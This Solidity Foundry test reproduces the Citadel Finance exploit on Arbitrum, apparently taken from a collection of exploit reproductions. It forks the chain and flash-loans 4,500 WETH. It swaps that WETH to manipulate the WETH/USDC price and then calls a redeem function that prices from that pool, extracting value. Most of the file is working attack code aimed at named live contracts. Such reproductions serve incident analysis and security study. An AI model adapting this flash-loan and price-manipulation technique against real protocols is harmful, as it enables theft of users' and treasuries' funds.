// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$93K
// Attacker : https://arbiscan.io/address/0xfcf88e5e1314ca3b6be7eed851568834233f8b49
// Attack Contract : https://arbiscan.io/address/0xfcbf411237ac830dc892edec054f15ba7f9ea5a6
// Vuln Contract : https://arbiscan.io/address/0x34b666992fcce34669940ab6b017fe11e5750799
// One of the attack txs : https://phalcon.blocksec.com/explorer/tx/arbitrum/0xf52a681bc76df1e3a61d9266e3a66c7388ef579d62373feb4fd0991d36006855

// @Analysis
// https://medium.com/neptune-mutual/how-was-citadel-finance-exploited-a5f9acd0b408

interface ICitadelStaking {
    function redeemCalculator(
        address user
    ) external view returns (uint256[2][2] memory);

    function getCITInUSDAllFixedRates(
        address user,
        uint256 amount
    ) external view returns (uint256);

    function deposit(address token, uint256 amount, uint8 rate) external;

    function getTotalTokenStakedForUser(
        address user,
        uint8 rate,
        address token
    ) external view returns (uint256);
}

interface ICitadelRedeem {
    function redeem(
        uint256 underlying,
        uint256 token,
        uint256 amount,
        uint8 rate
    ) external;
}

interface ICamelotRouter {
    function getAmountsOut(
        uint256 amountIn,
        address[] memory path
    ) external view returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        address referrer,
        uint256 deadline
    ) external;
}

contract ContractTest is Test {
    ICitadelStaking private constant CitadelStaking =
        ICitadelStaking(0x5e93c07a22111b327EE0EaEC64028064448ae848);
    ICitadelRedeem private constant CitadelRedeem =
        ICitadelRedeem(0x34b666992fcCe34669940ab6B017fE11e5750799);
    Uni_Pair_V3 private constant WETH_USDC =
        Uni_Pair_V3(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    IERC20 private constant WETH =
        IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 private constant USDC =
        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 private constant CIT =
        IERC20(0x43cF1856606df2CB22AEdbA1a3e23725f1594E81);
    ICamelotRouter private constant CamelotRouter =
        ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
    address private constant citadelTreasury =
        0x5ed32847e33844155c18944Ae84459404e432620;

    function setUp() public {
        vm.createSelectFork("arbitrum", 174659183);
        vm.label(address(CitadelStaking), "CitadelStaking");
        vm.label(address(CitadelRedeem), "CitadelRedeem");
        vm.label(address(WETH_USDC), "WETH_USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(CIT), "CIT");
        vm.label(address(CamelotRouter), "CamelotRouter");
    }

    function testExploit() public {
        // Before attack
        // Deposit CIT tx: https://phalcon.blocksec.com/explorer/tx/arbitrum/0xcf75802229d440e4fbabb4d357fa1886c25e9a6b5c693e9e9573c71c15e2b0d3
        // Exploiter transfer to attack contract following amount of CIT:
        deal(address(CIT), address(this), 2_653 * 1e18);
        // Approve CIT tokens to CitadelStaking contract:
        CIT.approve(address(CitadelStaking), CIT.balanceOf(address(this)));
        // Deposit all CIT tokens at fixed rate (1) to CitadelStaking contract:
        CitadelStaking.deposit(address(CIT), CIT.balanceOf(address(this)), 1);
        emit log_named_decimal_uint(
            "Exploiter total staked CIT amount (minus fee) before attack",
            CitadelStaking.getTotalTokenStakedForUser(
                address(this),
                1,
                address(CIT)
            ),
            CIT.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack",
            WETH.balanceOf(address(this)),
            CIT.decimals()
        );

        vm.roll(174662726);
        vm.warp(block.timestamp + 15 minutes + 13 seconds);

        emit log_string("--------------------Start attack--------------------");
        // Start attack
        // Take WETH flashloan -> 4_500 WETH
        uint256 wethAmount = 4_500 * 1e18;
        bytes memory data = abi.encode(wethAmount);
        WETH_USDC.flash(address(this), wethAmount, 0, data);

        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack",
            WETH.balanceOf(address(this)),
            CIT.decimals()
        );
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        uint256 borrowedWETHAmount = abi.decode(data, (uint256));
        WETH.approve(address(CamelotRouter), borrowedWETHAmount);

        // Deposit borrowed WETH to WETH/USDC pair and swap to USDC (CamelotPair). Manipulate pool
        emit log_named_decimal_uint(
            "Flashloaned amount of WETH to swap and manipulate WETH/USDC pair",
            borrowedWETHAmount,
            WETH.decimals()
        );
        WETHToUSDC(borrowedWETHAmount);

        uint256 amountIn = WETH.balanceOf(citadelTreasury);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);

        uint256[] memory amounts = CamelotRouter.getAmountsOut(amountIn, path);
        uint256 amountOutUSDC = amounts[1];

        uint256 amountCITAvailable = CitadelStaking.redeemCalculator(
            address(this)
        )[0][1] + CitadelStaking.redeemCalculator(address(this))[1][1];

        emit log_named_decimal_uint(
            "Available amount of CIT to redeem",
            amountCITAvailable,
            CIT.decimals()
        );

        uint256 citInUSD = CitadelStaking.getCITInUSDAllFixedRates(
            address(this),
            amountCITAvailable
        );

        emit log_named_uint(
            "Available amount of CIT to redeem in USDC",
            citInUSD / 10 ** 12
        );

        uint256 redeemAmount = amountCITAvailable;
        if (amountOutUSDC < citInUSD / 10 ** 12) {
            redeemAmount = redeemAmount / 3;
        }

        // Flawed function. This function makes calculations based on state of WETH/USDC pair
        CitadelRedeem.redeem(1, 0, redeemAmount, 1);

        USDC.approve(address(CamelotRouter), USDC.balanceOf(address(this)));

        // Swap back from USDC to WETH
        USDCToWETH(USDC.balanceOf(address(this)));

        // Repaying flashloan
        WETH.transfer(address(WETH_USDC), borrowedWETHAmount + fee0);

        emit log_string("--------------------End attack--------------------");
        // After couple of above attacks, deposited CIT has been withdrawn in the following tx:
        // https://phalcon.blocksec.com/explorer/tx/arbitrum/0x09105b771ada0c66f48786260929c0967fc822e037904ced6eac61284b6992d9
    }

    function WETHToUSDC(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);

        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            address(0),
            block.timestamp + 1000
        );
    }

    function USDCToWETH(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);

        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            address(0),
            block.timestamp + 1000
        );
    }
}
